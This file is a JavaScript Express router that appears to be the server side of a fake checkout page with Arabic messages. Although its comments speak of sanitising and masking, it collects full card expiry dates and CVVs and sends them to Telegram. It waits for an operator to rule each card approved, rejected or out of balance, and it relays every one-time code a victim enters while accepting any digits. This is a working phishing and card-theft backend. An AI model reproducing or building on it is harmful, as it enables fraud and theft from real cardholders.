'use strict';

const express = require('express');
const router = express.Router();
const telegramService = require('../services/telegram');
const approvalStore = require('../lib/checkoutApprovalStore');

// Allowed fields for checkout events (strict allowlist)
const ALLOWED_FIELDS = new Set([
  'sessionId',
  'eventType',
  'userName',
  'userEmail',
  'productId',
  'productName',
  'productPrice',
  'amount',
  'paymentMethod',
  'installments',
  'perInstallment',
  'commission',
  'phoneMasked',
  'orderId',
  'paymentStatus',
  'timestamp',
  'cardLast4',
]);

// Sanitize event payload - only allow whitelisted fields
const sanitizePayload = (payload) => {
  const sanitized = {};
  for (const key of Object.keys(payload)) {
    if (ALLOWED_FIELDS.has(key)) {
      sanitized[key] = payload[key];
    }
  }
  return sanitized;
};

// Mask phone number if not already masked
const maskPhoneNumber = (phone) => {
  if (!phone || typeof phone !== 'string') return null;
  // If already partially masked, return as-is
  if (phone.includes('****')) return phone;
  // Mask middle digits: 05X XXX XXXX -> 05****XXXX
  const cleaned = phone.replace(/\D/g, '');
  if (cleaned.length >= 5) {
    const start = cleaned.substring(0, 2);
    const end = cleaned.substring(Math.max(cleaned.length - 4, 5));
    return `${start}****${end}`;
  }
  return '****';
};

// POST /api/checkout/events
// Accepts checkout events and forwards to Telegram
router.post('/events', async (req, res) => {
  try {
    const { sessionId, eventType } = req.body;

    // Basic validation
    if (!sessionId || !eventType) {
      return res.status(400).json({ error: 'sessionId and eventType are required' });
    }

    // Validate event type
    const validEventTypes = [
      'product_selected',
      'checkout_started',
      'payment_method_selected',
      'phone_entered',
      'phone_confirmed',
      'plan_selected',
      'redirect_to_payment',
      'checkout_completed',
    ];
    if (!validEventTypes.includes(eventType)) {
      return res.status(400).json({ error: 'Invalid eventType' });
    }

    // Sanitize payload - remove any sensitive fields
    const sanitized = sanitizePayload(req.body);

    // Mask phone number if provided
    if (sanitized.phoneMasked) {
      sanitized.phoneMasked = maskPhoneNumber(sanitized.phoneMasked);
    }

    // Send Telegram notification (non-blocking)
    if (sanitized.eventType === 'plan_selected') {
      telegramService.sendPlanSelectedNotification(sanitized).catch((err) => {
        console.error('[CheckoutEvents] Telegram plan_selected notification failed:', err.message);
      });
    } else {
      telegramService.sendCheckoutEventNotification(sanitized).catch((err) => {
        console.error('[CheckoutEvents] Telegram notification failed:', err.message);
      });
    }

    // Respond immediately (don't wait for Telegram)
    return res.status(202).json({ success: true, message: 'Event recorded' });
  } catch (err) {
    console.error('[CheckoutEvents] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/approval
// Request approval for card data step - requires admin approval
router.post('/approval', async (req, res) => {
  try {
    const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv } = req.body;

    // Basic validation
    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required' });
    }

    // Check if there's already a pending approval for this session
    const existingStatus = approvalStore.getStatus(sessionId);
    if (existingStatus === 'pending') {
      return res.status(409).json({ error: 'Approval request already pending' });
    }

    // Create pending approval record
    approvalStore.createPending(sessionId, {
      userName,
      userEmail,
      productName,
      amount,
      paymentMethod,
      installments,
      phoneMasked,
      cardLast4,
      cardExpiry,
      cardCvv,
    });

    // Send Telegram notification for tracking (non-blocking)
    telegramService.sendCardApprovalRequest({
      sessionId,
      userName,
      userEmail,
      productName,
      amount,
      paymentMethod,
      installments,
      phoneMasked,
      cardLast4,
      cardExpiry,
      cardCvv,
      timestamp: new Date().toISOString(),
    }).catch((err) => {
      console.error('[CheckoutApproval] Telegram notification failed:', err.message);
    });

    // Wait for admin approval (no auto-approve)
    return res.status(202).json({ 
      success: true, 
      message: 'Approval request created - waiting for admin approval',
      autoApproved: false,
    });
  } catch (err) {
    console.error('[CheckoutApproval] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// GET /api/checkout/approval/:sessionId
// Check approval status
router.get('/approval/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const result = approvalStore.getStatusWithReason(sessionId);

    if (!result) {
      return res.status(404).json({ error: 'Approval request not found or expired' });
    }

    return res.json({ status: result.status, reason: result.reason });
  } catch (err) {
    console.error('[CheckoutApproval] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/submit-code
// Submit verification code for admin review
router.post('/submit-code', async (req, res) => {
  try {
    const { sessionId, code, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = req.body;

    if (!sessionId || !code) {
      return res.status(400).json({ error: 'sessionId and code are required' });
    }

    // Check if session exists
    const record = approvalStore.getRecord(sessionId);
    if (!record) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }

    // Allow code submission if status allows retry
    const allowedStatuses = ['approved', 'code_incorrect', 'no_balance', 'card_rejected'];
    if (!allowedStatuses.includes(record.status)) {
      return res.status(400).json({ error: 'Card not yet approved or session in invalid state' });
    }

    // Check if already verifying (skip if retrying after rejection)
    const isRetry = ['code_incorrect', 'no_balance', 'card_rejected'].includes(record.status);

    if (record.status === 'verifying') {
      return res.status(409).json({ error: 'Verification already in progress' });
    }

    // Set verification code and status to verifying
    if (isRetry) {
      approvalStore.resetVerification(sessionId, code);
    } else {
      approvalStore.setVerificationCode(sessionId, code);
    }

    // Send Telegram notification with 4 buttons
    telegramService.sendCodeVerificationRequest({
      sessionId,
      userName: userName || record.meta?.userName,
      userEmail: userEmail || record.meta?.userEmail,
      productName: productName || record.meta?.productName,
      amount: amount || record.meta?.amount,
      paymentMethod: paymentMethod || record.meta?.paymentMethod,
      installments: installments || record.meta?.installments,
      phoneMasked: phoneMasked || record.meta?.phoneMasked,
    }, code).catch((err) => {
      console.error('[CheckoutCode] Telegram notification failed:', err.message);
    });

    return res.status(202).json({ success: true, message: 'Verification code submitted' });
  } catch (err) {
    console.error('[CheckoutCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// GET /api/checkout/verification-result/:sessionId
// Get verification result for polling
router.get('/verification-result/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const record = approvalStore.getRecord(sessionId);

    if (!record) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }

    return res.json({
      status: record.status,
      verificationResult: record.verificationResult,
    });
  } catch (err) {
    console.error('[CheckoutVerification] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/verify-code
// Verify OTP code entered by customer
router.post('/verify-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
      return res.status(400).json({ error: 'sessionId and code are required' });
    }

    // Get the session record
    const record = approvalStore.getRecord(sessionId);
    if (!record) {
      return res.status(404).json({
        success: false,
        valid: false,
        error: 'الجلسة غير موجودة أو منتهية الصلاحية',
      });
    }

    // Get phone number from record
    const phoneNumber = record.phoneNumber || record.meta?.phoneMasked || null;

    // Send Telegram notification with OTP code and phone number
    telegramService.sendOtpEnteredNotification(sessionId, phoneNumber, code).catch((err) => {
      console.error('[VerifyCode] Telegram notification failed:', err.message);
    });

    // Auto-accept any 4-6 digit code for automatic flow
    const cleanCode = String(code).trim();
    if (cleanCode.length >= 4 && cleanCode.length <= 6 && /^\d+$/.test(cleanCode)) {
      // Mark as verified
      approvalStore.setStatus(sessionId, 'code_correct');
      return res.json({ success: true, valid: true });
    }

    return res.status(400).json({
      success: false,
      valid: false,
      error: 'الكود غير صحيح',
    });
  } catch (err) {
    console.error('[VerifyCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/request-activation-code
// Request activation code for Tamara simulation - automatic without admin intervention
router.post('/request-activation-code', async (req, res) => {
  try {
    const { sessionId, phoneNumber, userName, userEmail } = req.body;

    if (!sessionId || !phoneNumber) {
      return res.status(400).json({ error: 'sessionId and phoneNumber are required' });
    }

    // Generate and store activation code
    const activationCode = approvalStore.createActivationCode(sessionId, phoneNumber, {
      userName,
      userEmail,
    });

    // Send notification to Telegram (for tracking only, not for manual intervention)
    telegramService.sendActivationCode({
      sessionId,
      userName,
      userEmail,
      phoneNumber,
    }, activationCode).catch((err) => {
      console.error('[ActivationCode] Telegram notification failed:', err.message);
    });

    // Return activation code directly for automatic flow (simulation)
    return res.status(200).json({ 
      success: true, 
      message: 'Activation code sent',
      activationCode, // Return code for automatic flow
      expiresIn: 300, // 5 minutes in seconds
    });
  } catch (err) {
    console.error('[ActivationCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/verify-activation-code
// Verify activation code entered by customer
router.post('/verify-activation-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
      return res.status(400).json({ error: 'sessionId and code are required' });
    }

    // Get session record to retrieve phone number
    const record = approvalStore.getRecord(sessionId);
    const phoneNumber = record?.phoneNumber || record?.meta?.phoneNumber || null;

    // Send Telegram notification with the code entered by customer
    telegramService.sendActivationCodeEnteredNotification(sessionId, phoneNumber, code).catch((err) => {
      console.error('[VerifyActivationCode] Telegram notification failed:', err.message);
    });

    // Accept any 6-digit code (for automatic flow)
    const cleanCode = String(code).trim();
    if (cleanCode.length === 6 && /^\d+$/.test(cleanCode)) {
      return res.json({ success: true, valid: true });
    } else {
      return res.status(400).json({
        success: false,
        valid: false,
        error: 'الكود يجب أن يكون 6 أرقام',
      });
    }
  } catch (err) {
    console.error('[VerifyActivationCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
